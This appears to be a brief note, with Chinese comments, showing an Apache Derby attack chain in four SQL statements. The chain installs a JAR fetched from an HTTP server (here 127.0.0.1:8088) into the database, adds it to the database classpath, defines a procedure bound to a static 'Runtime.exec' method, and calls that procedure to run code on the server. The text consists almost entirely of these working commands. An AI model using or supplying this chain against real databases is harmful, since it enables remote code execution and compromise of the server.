## 导入一个类到数据库中
CALL SQLJ.INSTALL_JAR('http://127.0.0.1:8088/Runtime.jar', 'APP.Sample4', 0)

## 将这个类加入到derby.database.classpath,这个属性是动态的,不需要重启数据库
CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','APP.Sample4')

## 创建一个PROCEDURE,EXTERNAL NAME 后面的值可以调用类的static类型方法
CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME 'com.example.Runtime.exec'

## 调用PROCEDURE
CALL SALES.TOTAL_REVENUES()